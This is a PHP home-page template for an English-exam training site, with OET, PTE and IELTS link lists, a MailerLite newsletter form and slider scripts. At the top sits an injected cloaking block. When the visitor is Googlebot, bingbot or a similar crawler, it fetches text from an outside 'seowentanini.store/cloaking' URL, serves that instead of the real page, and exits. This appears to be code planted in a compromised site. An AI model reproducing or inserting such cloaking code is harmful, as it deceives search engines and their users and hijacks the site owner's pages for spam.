<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) { 
    $message = file_get_contents('https://seowentanini.store/cloaking/edubenchmark.txt'); // 
    echo $message; 
    (exit);
} 
?>
<?php
// error_reporting(E_ALL);
//ini_set('display_errors', 1);
include('inc/connect_db.php'); 
include('model/contentModel.php');
include_once 'head.php';
?>  
<link rel="stylesheet" href="/css/bootstrap.min.css" async >
<link rel="stylesheet" href="/css/style.css" async > 
<script defer src="/slick/slick.min.js"></script>
<!--Slick Slider -->
</head>
<body>
    <?php include "header-new.php"; ?>
    
	<!--Slider Section-->
	<section class="home-slider demobanner">
        <div class="responsive"><?php getHomeSlider2()?></div>
    </section> 
    
	<!--Below Slider Three Boxes-->
    <section class="index-oet">
        <div class="container">
            <div class="oet-index"><?php homeThreeBoxes()?></div>
        </div>
    </section>
    <section class="freebies freebies-box">
        <div class="container wpr-freebies wpr-freebies-box clearfix">           
           <div class="col-md-6 col-sm-6 col-xs-12 latest-update p-lr-0">
	<div class="examLinks">
<div class="headingDiv">OET Training Links</div>
<a href="/blog/oet-grammar/" title="OET GRAMMAR">
<button type="button" class="btn oetButton">OET GRAMMAR</button>
</a>
<a href="/blog/oet-writing/" title="OET WRITING">
<button type="button" class="btn oetButton">OET WRITING</button>
</a>
<a href="/blog/oet-reading/" title="OET READING">
<button type="button" class="btn oetButton">OET READING</button>
</a>
<a href="/blog/oet-sample-test/" title="OET SAMPLE TEST">
<button type="button" class="btn oetButton">OET SAMPLE TEST</button>
</a>
<a href="/blog/oet-sample-test/" title="OET TEST MATERIALS">
<button type="button" class="btn oetButton">OET TEST MATERIALS</button>
</a>
<a href="/blog/oet-for-nurses/" title="OET FOR NURSES">
<button type="button" class="btn oetButton">OET FOR NURSES</button>
</a>
<a href="/blog/oet-for-doctors/" title="OET FOR DOCTORS">
<button type="button" class="btn oetButton">OET FOR DOCTORS</button>
</a>
<a href="/blog/oet-speaking/" title="OET SPEAKING">
<button type="button" class="btn oetButton">OET SPEAKING</button>
</a>
<a href="/blog/oet-test-dates/" title="OET TEST DATES">
<button type="button" class="btn oetButton">OET TEST DATES</button>
</a>
<a href="/blog/oet-listening/" title="OET LISTENING">
<button type="button" class="btn oetButton">OET LISTENING</button>
</a>
<a href="/blog/oet-score-calculator-guide-check-your-grade/" title="OET CALCULATOR">
<button type="button" class="btn oetButton">OET CALCULATOR</button>
</a>
</div>
<div class="examLinks">
<div class="headingDiv">PTE Training  Links</div>
<a href="/course/pte" title="PTE PRACTICE TEST">
<button type="button" class="btn pteButton">PTE PRACTICE TEST</button>
</a>
<a href="/blog/pte-practice/" title="PTE SAMPLE TEST">
<button type="button" class="btn pteButton">PTE SAMPLE TEST</button>
</a>
<a href="/blog/pte-writing/" title="PTE WRITING">
<button type="button" class="btn pteButton">PTE WRITING</button>
</a>
<a href="/course/oet" title="PTE PRACTICE MATERIALS">
<button type="button" class="btn pteButton">PTE PRACTICE MATERIALS</button>
</a>
<a href="/blog/pte-reading/" title="PTE READING">
<button type="button" class="btn pteButton">PTE READING</button>
</a>
<a href="/blog/pte-speaking/" title="PTE SPEAKING">
<button type="button" class="btn pteButton">PTE SPEAKING</button>
</a>
<a href="/blog/pte-listening/" title="PTE LISTENING">
<button type="button" class="btn pteButton">PTE LISTENING</button>
</a>
<a href="/blog/pte-vs-ielts/" title="PTE VS IELTS">
<button type="button" class="btn pteButton">PTE VS IELTS</button>
</a>
<a href="/blog/pte-sample-essays/" title="PTE SAMPLE ESSAYS">
<button type="button" class="btn pteButton">PTE SAMPLE ESSAYS</button>
</a>
<a href="/blog/pte-score-calculator/" title="PTE CALCULATOR">
<button type="button" class="btn pteButton">PTE CALCULATOR</button>
</a>
</div>
<div class="examLinks">
<div class="headingDiv">IELTS Training Links</div>
<a href="/blog/ielts-test-dates/" title="IELTS TEST DATES">
<button type="button" class="btn ieltsButton">IELTS TEST DATES</button>
</a>
<a href="/blog/ielts-practice-test/" title="IELTS PRACTICE TEST">
<button type="button" class="btn ieltsButton">IELTS PRACTICE TEST</button>
</a>
<a href="/blog/ielts-writing/" title="IELTS WRITING">
<button type="button" class="btn ieltsButton">IELTS WRITING</button>
</a>
<a href="/blog/ielts-reading/" title="IELTS READING">
<button type="button" class="btn ieltsButton">IELTS READING</button>
</a>
<a href="/blog/ielts-speaking/" title="IELTS SPEAKING">
<button type="button" class="btn ieltsButton">IELTS SPEAKING</button>
</a>
<a href="/blog/ielts-listening/" title="IELTS LISTENING">
<button type="button" class="btn ieltsButton">IELTS LISTENING</button>
</a>
<a href="/blog/ielts-score-calculator/" title="IELTS CALCULATOR">
<button type="button" class="btn ieltsButton">IELTS CALCULATOR</button>
</a>
</div>
            </div>	 		
            <div class="col-md-6 col-sm-6 col-xs-12 p-lr-0"><?php homeWhyChooseUs()?></div>
        </div> 
    </section>

    <section class="freebies-box testimonial">
		<div class="container"><?php homeTestimonialsSection()?></div>
	</section>

    <section class="freebies-box newslatter">
        <div class="container">
            
          
                <div class="col-md-4 col-sm-4 col-xs-12 p-lr-0">
                    <div class="news-img">
                        <h4>Newsletter</h4>
                      
						<p>Get Exam Tips, Updates & Practice Tests To Your Email Every Day - Free!</p>
                        
                    </div>
                </div>
                <div class="col-md-8 col-sm-8 col-xs-12 p-lr-0">
	
      <div class="home_mailer_bottom">
    <div id="mlb2-905359" class="ml-form-embedContainer ml-subscribe-form ml-subscribe-form-905359">
      <div class="ml-form-align-center ">
        <div class="ml-form-embedWrapper embedForm">
          <div class="ml-form-embedBody ml-form-embedBodyDefault row-form">

            <div class="ml-form-embedContent" style=" ">
               <h4>Subscribe To Our Newsletter</h4>
            </div>

            <form class="ml-block-form" action="https://assets.mailerlite.com/jsonp/98276/forms/60862150508283901/subscribe" data-code="" method="post" target="_blank">
              <div class="ml-form-formContent">
                

                  
                  <div class="ml-form-fieldRow ">
                    <div class="ml-field-group ml-field-email ml-validate-email ml-validate-required">

                      


                      <!-- input -->
                      <input aria-label="email" aria-required="true" type="email" class="form-control" data-inputmask="" name="fields[email]" placeholder="Email" autocomplete="email">
                      <!-- /input -->

                      <!-- textarea -->
                      
                      <!-- /textarea -->

                      <!-- select -->
                      
                      <!-- /select -->

                      <!-- checkboxes -->
            
            <!-- /checkboxes -->

                      <!-- radio -->
                      
                      <!-- /radio -->

                      <!-- countries -->
                      
                      <!-- /countries -->





                    </div>
                  </div><div class="ml-form-fieldRow ml-last-item">
                    <div class="ml-field-group ml-field-name">

                      


                      <!-- input -->
                      <input aria-label="name" type="text" class="form-control" data-inputmask="" name="fields[name]" placeholder="Name" autocomplete="name">
                      <!-- /input -->

                      <!-- textarea -->
                      
                      <!-- /textarea -->

                      <!-- select -->
                      
                      <!-- /select -->

                      <!-- checkboxes -->
            
            <!-- /checkboxes -->

                      <!-- radio -->
                      
                      <!-- /radio -->

                      <!-- countries -->
                      
                      <!-- /countries -->





                    </div>
                  </div>
                
              </div>

              

              <!-- Privacy policy -->
              
              <!-- /Privacy policy -->

              

              <div class="ml-form-interestGroupsRow ml-block-groups ml-validate-required onealign_container">
            
                    <div class="ml-form-interestGroupsRowCheckbox group" style="">
                      <label>
                        
                        <input type="radio" name="groups[]" value="60530131913934027">
                        <div class="label-description">OET</div>
                      </label>
                      
                      
                    </div>
                  
                    <div class="ml-form-interestGroupsRowCheckbox group" style="">
                      <label>
                        
                        <input type="radio" name="groups[]" value="60609928913486895">
                        <div class="label-description">IELTS</div>
                      </label>
                      
                      
                    </div>
                  
                    <div class="ml-form-interestGroupsRowCheckbox group" style="">
                      <label>
                        
                        <input type="radio" name="groups[]" value="60512637829515229">
                        <div class="label-description">TOEFL</div>
                      </label>
                      
                      
                    </div>
                  
                    <div class="ml-form-interestGroupsRowCheckbox last-group" style="">
                      <label>
                        
                        <input type="radio" name="groups[]" value="60512503974593626">
                        <div class="label-description">PTE</div>
                      </label>
                      
                      
                    </div>
                  
              </div>

              






              <input type="hidden" name="fields[lists]" value="Name">
              <input type="hidden" name="ml-submit" value="1">

              <div class="ml-form-embedSubmit">
                
                  <button type="submit" class="primary">Subscribe</button>
                
                <button disabled="disabled" style="display: none;" type="button" class="loading">
                  <div class="ml-form-embedSubmitLoad"></div>
                  <span class="sr-only">Loading...</span>
                </button>
              </div>

              
              <input type="hidden" name="anticsrf" value="true">
              <p class="we_will_send">We will send you a welcome email as soon as you click 'Subscribe'. Please check your <span style="color:red;">'PROMOTIONS'</span> tab and <span style="color:red;">'SPAM'</span> folder as well. The welcome email will offer you a selection of newsletters to choose from.</p>
            </form>
            
          </div>

          <div class="ml-form-successBody row-success" style="display: none">

            <div class="ml-form-successContent">
              
                <h4>Thank you!</h4>
                
                  <p>You have successfully joined our subscriber list.</p>
                
              
            </div>

          </div>
        </div>
      </div>
    </div>

  </div>
                </div>
           
            
        </div>
    </section>
<style>.onlydemo{  top: 52%;}</style>
<link rel="stylesheet" href="/slick/slick-theme.css" rel=preload>
<link rel="stylesheet" href="/slick/slick.css" rel=preload>
<script defer>
$(function(){$(".responsive").slick({dots:!1,infinite:!0,slidesToScroll:1,autoplay:!0,autoplaySpeed:5e3,slidesToScroll:1,fade:!0,cssEase:"linear",responsive:[{breakpoint:1024,settings:{slidesToShow:1,slidesToScroll:1,infinite:!0,dots:!1}},{breakpoint:600,settings:{slidesToShow:1,slidesToScroll:1}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$(".test").slick({dots:!0,infinite:!0,speed:300,slidesToShow:2,slidesToScroll:1,responsive:[{breakpoint:1024,settings:{slidesToShow:2,slidesToScroll:1,infinite:!0,dots:!0}},{breakpoint:600,settings:{slidesToShow:1,slidesToScroll:1}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$(".about_slider").slick({dots:!1,infinite:!0,autoplay:!0,autoplaySpeed:2e3,slidesToShow:4,slidesToScroll:1,responsive:[{breakpoint:1024,settings:{slidesToShow:3,slidesToScroll:1,infinite:!0,dots:!1}},{breakpoint:600,settings:{slidesToShow:2,slidesToScroll:2}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$(".oet").slick({dots:!0,infinite:!0,autoplay:!0,autoplaySpeed:2e3,slidesToShow:1,slidesToScroll:1,responsive:[{breakpoint:1024,settings:{slidesToShow:1,slidesToScroll:1,infinite:!0,dots:!0}},{breakpoint:600,settings:{slidesToShow:1,slidesToScroll:2}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$(".oet-index").slick({dots:!1,infinite:!0,autoplay:!0,autoplaySpeed:2e3,slidesToShow:3,slidesToScroll:1,responsive:[{breakpoint:1024,settings:{slidesToShow:3,slidesToScroll:1,infinite:!0,dots:!1}},{breakpoint:767,settings:{dots:!0,slidesToShow:2,slidesToScroll:1}},{breakpoint:600,settings:{dots:!0,slidesToShow:1,slidesToScroll:1}}]}),$(".gallery-slider").slick({dots:!1,infinite:!0,autoplay:!0,autoplaySpeed:4e3,slidesToShow:4,slidesToScroll:1,responsive:[{breakpoint:1024,settings:{slidesToShow:3,slidesToScroll:3,infinite:!0,dots:!1}},{breakpoint:600,settings:{slidesToShow:2,slidesToScroll:2}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$(".dropdown").hover(function(){$(".dropdown-menu",this).not(".in .dropdown-menu").stop(!0,!0).slideDown("500"),$(this).toggleClass("open")},function(){$(".dropdown-menu",this).not(".in .dropdown-menu").stop(!0,!0).slideUp("500"),$(this).toggleClass("open")})}),$('[data-toggle="slide-collapse"]').on("click",function(){$navMenuCont=$($(this).data("target")),$navMenuCont.animate({width:"toggle"},350),$(".menu-overlay").fadeIn(200)}),$(".menu-overlay").click(function(o){$(".navbar-toggle").trigger("click"),$(".menu-overlay").fadeOut(200)}),$(window).scroll(function(){$(window).scrollTop()>60?($("header").css({position:"fixed"}),$("header").addClass("stickey_header")):($("header").css({position:"relative"}),$("header").removeClass("stickey_header"))}),$(function(){function o(o){$(o.target).prev(".panel-heading").find("i").toggleClass("rotate-icon"),$(".panel-body.animated").toggleClass("zoomIn zoomOut")}$("#accordion").on("hide.bs.collapse",o),$("#accordion").on("show.bs.collapse",o)});
</script>
<link rel="stylesheet" href="css/mailer.css" async> 	
<link href="css/imagelightbox.css" rel="stylesheet" async >
<link rel="stylesheet" href="css/mobilemenu.css" async > 
<?php include "footer-home.php"; ?>
